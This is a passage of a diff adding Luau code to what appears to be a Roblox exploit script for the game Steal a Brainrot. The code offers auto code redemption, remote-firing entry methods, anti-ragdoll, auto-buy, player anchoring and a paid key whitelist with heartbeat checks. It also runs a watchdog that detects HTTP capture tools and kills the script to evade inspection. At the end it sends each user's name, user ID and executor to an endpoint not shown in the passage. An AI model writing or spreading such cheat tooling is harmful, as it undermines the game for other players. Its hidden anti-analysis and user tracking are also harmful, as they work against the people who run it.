+	})
+
+	lib.CreateParagraph(v6, {
+		Title = "About the accent colour",
+		Content = [[Picking a colour is a live preview: most of the UI repaints straight away, but a few outlines keep the old colour until the panel is rebuilt. Your choice is saved, so the next execution is built in that colour from the start.
+
+UI Size applies when you release the slider, no re-execute needed.]],
+	})
+
+	v2 = lib.CreateStatusLog(v7, { Height = 185, MaxLines = 300 })
+	local tbl13 = { "code is", "riddle is", "use code", "question is", "", "", "", "", "", "" }
+
+	local function fn46(arg, arg2)
+		local v25 = lib.Flags[arg]
+		if not v25 then
+			fn6("Config: no flag named \"" .. arg .. "\"", Color3.fromRGB(255, 200, 90))
+			return
+		end
+		local ok, result = pcall(v25.Set, arg2)
+
+		if not ok then
+			local color = Color3.fromRGB
+			fn6("Config: failed to set \"" .. arg .. "\" – " .. tostring(result), color(220, 80, 80))
+		end
+	end
+
+	fn27 = function()
+		fn46("autoCode", true)
+		fn46("captureCount", "3")
+		fn46("riddleCount", "1")
+		fn46("triggers", tbl13)
+		fn46("uiScale", 100)
+
+		if not flag11 then
+			fn25()
+			fn6("Recommended config applied (Free). Authenticate for the full set.", Color3.fromRGB(120, 200, 120))
+			lib.ShowNotification("VON", "Free recommended config applied", 4)
+			return
+		end
+
+		fn46("entryMethod", "Remote")
+		fn46("scanMode", "Controller")
+		fn46("antiRagdoll", true)
+		fn46("autoBuy", true)
+		fn46("anchorPlayer", true)
+		fn46("aiEnabled", true)
+		fn46("aiMinChars", "20")
+		fn46("aiMinSpaces", "1")
+		fn37(true)
+		fn25()
+		fn6("Recommended config applied (Full).", Color3.fromRGB(120, 200, 120))
+		lib.ShowNotification("VON", "Full recommended config applied", 4)
+	end
+
+	fn26 = function()
+		v8.SetText(flag11 and "Apply Recommended Config (Full)" or "Apply Recommended Config (Free)")
+
+		if flag11 then
+			v9.SetItems({ "Firesignal", "Remote" }, true)
+			v10.SetItems({ "ChildAdded", "Controller" }, true)
+			v11.SetDisabled(false)
+			v12.SetDisabled(false)
+			v13.SetDisabled(false)
+			v24.SetDisabled(false)
+
+			local tbl14 = {
+				entryMethod = str8 == "remote" and "Remote" or "Firesignal",
+				scanMode = str9 == "controller" and "Controller" or "ChildAdded",
+				antiRagdoll = flag7,
+				autoBuy = flag8,
+				anchorPlayer = flag9,
+			}
+
+			for k, v25 in pairs(tbl12) do
+				local v26 = lib.Flags[k]
+
+				if v26 and tbl14[k] ~= v25 then
+					pcall(v26.Set, v25)
+				end
+			end
+		else
+			v9.SetItems({ "Firesignal" }, true)
+			v10.SetItems({ "ChildAdded" }, true)
+			str8 = "firesignal"
+			str9 = "childadded"
+			flag7 = false
+			flag8 = false
+			flag9 = false
+			flag10 = false
+			v11.Set(false)
+			v12.Set(false)
+			v13.Set(false)
+			v24.Set(false)
+			v11.SetDisabled(true)
+			v12.SetDisabled(true)
+			v13.SetDisabled(true)
+			v24.SetDisabled(true)
+			fn21(false)
+		end
+	end
+
+	pcall(lib.LoadConfig, "von_autocode")
+
+	for _, v25 in ipairs({ "aiProvider", "aiModel", "aiCustomModel" }) do
+		local v26 = tbl[v25]
+		local v27 = lib.Flags[v25]
+
+		if v27 and v26 ~= nil then
+			pcall(v27.Set, v26)
+		end
+	end
+
+	for k, v25 in pairs({ ["sk-or-"] = "OpenRouter", ["sk-ant-"] = "Anthropic", ["xai-"] = "xAI / Grok" }) do
+		if str3 ~= "" and str3:sub(1, #k) == k then
+			str3 = ""
+			local aiUserKey = lib.Flags.aiUserKey
+
+			if aiUserKey then
+				pcall(aiUserKey.Set, "")
+			end
+
+			fn6("AI: cleared the saved " .. v25 .. " key – that provider was removed. Grab a free Cerebras/Groq/SambaNova/Gemini key on the AI tab.", Color3.fromRGB(255, 200, 90))
+			fn25()
+			break
+		end
+	end
+
+	fn26()
+
+	task.delay(0.35, function()
+		fn44(n13)
+	end)
+end
+
+fn16()
+task.spawn(fn19)
+fn14()
+
+localPlayer.CharacterAdded:Connect(function()
+	task.delay(1, fn14)
+end)
+
+task.spawn(fn17)
+
+task.spawn(function()
+	fn6("Whitelist: environment probe – " .. tbl2.note, tbl2.virtualised and Color3.fromRGB(255, 200, 90) or Color3.fromRGB(120, 200, 120))
+
+	if tbl2.virtualised then
+		fn6("Whitelist: obfuscated/virtualised environment detected – the stdlib closure heuristic is unreliable here; the executor-side differential and the artifact scan still run", Color3.fromRGB(255, 200, 90))
+	end
+
+	local v14, v15, v16 = tbl3.check()
+	fn6("Whitelist: capture-tool scan – " .. v16, Color3.fromRGB(160, 160, 170))
+
+	if v14 > 0 then
+		fn6("Whitelist: capture-tool scan raised " .. v14 .. " – " .. table.concat(v15, "; "), v14 >= n12 and Color3.fromRGB(220, 80, 80) or Color3.fromRGB(255, 200, 90))
+	end
+
+	if v14 >= tbl3.KILL_AT then
+		tbl3.kill("startup scan: " .. table.concat(v15, "; "))
+		return
+	end
+	local v17 = fn10()
+
+	if v17 then
+		local ok, result, result2, result3 = pcall(fn12, v17, true)
+
+		if not ok then
+			local color = Color3.fromRGB
+			fn6("Whitelist: restoring the saved key errored – " .. tostring(result), color(220, 80, 80))
+			result2 = tostring(result)
+			result3 = "transport"
+			result = false
+		end
+
+		if result then
+			local color = Color3.fromRGB
+			fn6("Whitelist: restored access as " .. tostring(result2), color(120, 200, 120))
+			fn28()
+			task.spawn(fn13)
+		elseif result3 == "denied" then
+			local color = Color3.fromRGB
+			fn6("Whitelist: saved key rejected (" .. tostring(result2) .. ") – re-authenticate", color(220, 80, 80))
+			fn11()
+		else
+			v3 = v17
+			local color = Color3.fromRGB
+			fn6("Whitelist: could not verify saved key (" .. tostring(result2) .. ") – key kept, will retry", color(255, 200, 90))
+		end
+	else
+		fn6("Whitelist: no saved key – AI locked until you authenticate (Main tab)", Color3.fromRGB(255, 200, 90))
+	end
+
+	flag12 = true
+end)
+
+task.spawn(function()
+	local flag13 = false
+	local v14
+
+	while true do
+		task.wait(5)
+
+		if tbl3.killed then
+			return
+		else
+			local v15
+			v15, v14 = tbl3.check()
+			if tbl3.KILL_AT <= v15 then
+				break
+			end
+
+			if v15 >= n12 then
+				if not flag13 then
+					local color = Color3.fromRGB
+					fn6("Whitelist: HTTP capture tool suspected – " .. table.concat(v14, "; "), color(220, 80, 80))
+					flag13 = true
+				end
+
+				if flag11 then
+					flag11 = false
+					username = nil
+					v3 = nil
+					fn6("Whitelist: access revoked while a capture tool is present. Close it and re-execute the script.", Color3.fromRGB(220, 80, 80))
+					pcall(fn28)
+				end
+			else
+				flag13 = false
+			end
+		end
+	end
+
+	tbl3.kill("watchdog: " .. table.concat(v14, "; "))
+end)
+
+local n13 = 6
+
+task.spawn(function()
+	local n14 = 0
+
+	while true do
+		task.wait(300)
+
+		if flag11 then
+			local v14 = v3 or fn10()
+
+			if v14 then
+				local ok, result, result2, result3 = pcall(fn12, v14, true)
+
+				if not ok then
+					local color = Color3.fromRGB
+					fn6("Whitelist: heartbeat errored – " .. tostring(result), color(255, 200, 90))
+					local str10 = tostring(result)
+					n14 += 1
+
+					if n13 <= n14 then
+						flag11 = false
+						username = nil
+						local color2 = Color3.fromRGB
+						fn6("Whitelist: heartbeat unreachable " .. n13 .. " times in a row (" .. tostring(str10) .. ") – access revoked", color2(220, 80, 80))
+						fn28()
+						n14 = 0
+						continue
+					end
+
+					local str11 = ") – keeping access, attempt " .. n14 .. "/" .. n13
+					local color2 = Color3.fromRGB
+					fn6("Whitelist: heartbeat could not verify (" .. tostring(str10) .. str11, color2(255, 200, 90))
+					continue
+				end
+
+				if result then
+					fn6("Whitelist: heartbeat re-check OK", Color3.fromRGB(120, 200, 120))
+					n14 = 0
+					continue
+				end
+
+				if result3 == "denied" or result3 == "tamper" then
+					local color = Color3.fromRGB
+					fn6("Whitelist: heartbeat re-check FAILED (" .. tostring(result2) .. ") – access revoked", color(220, 80, 80))
+					fn28()
+					n14 = 0
+					continue
+				end
+
+				n14 += 1
+
+				if n14 >= n13 then
+					flag11 = false
+					username = nil
+					local color = Color3.fromRGB
+					fn6("Whitelist: heartbeat unreachable " .. n13 .. " times in a row (" .. tostring(result2) .. ") – access revoked", color(220, 80, 80))
+					fn28()
+					n14 = 0
+					continue
+				end
+
+				local str10 = ") – keeping access, attempt " .. n14 .. "/" .. n13
+				fn6("Whitelist: heartbeat could not verify (" .. tostring(result2) .. str10, Color3.fromRGB(255, 200, 90))
+			end
+		end
+	end
+end)
+
+if fn5() then
+	local color = Color3.fromRGB
+	fn6("Game check: IN Steal a Brainrot (GameId " .. tostring(game.GameId) .. ")", color(120, 200, 120))
+else
+	local color = Color3.fromRGB
+	fn6("Game check: NOT in Steal a Brainrot (GameId " .. tostring(game.GameId) .. ") – AI still works, but its knowledge base is about Steal a Brainrot", color(255, 200, 90))
+end
+
+fn6("Script loaded – Sammy AI is LOCKED until whitelisted (Main tab → Key System)", Color3.fromRGB(255, 200, 90))
+
+pcall(function()
+	if not game:IsLoaded() then
+		game.Loaded:Wait()
+	end
+
+	local Players2 = game:GetService("Players")
+	game:GetService("HttpService")
+	local localPlayer2 = Players2.LocalPlayer
+	local str10 = "auto code redeemer"
+
+	local function fn29()
+		return identifyexecutor()
+	end
+
+	local function fn30()
+		fn18({ type = "execution", script = str10, executor = fn29(), username = localPlayer2.Name, userId = localPlayer2.UserId })
+	end
+
+	task.spawn(fn30)
+end)
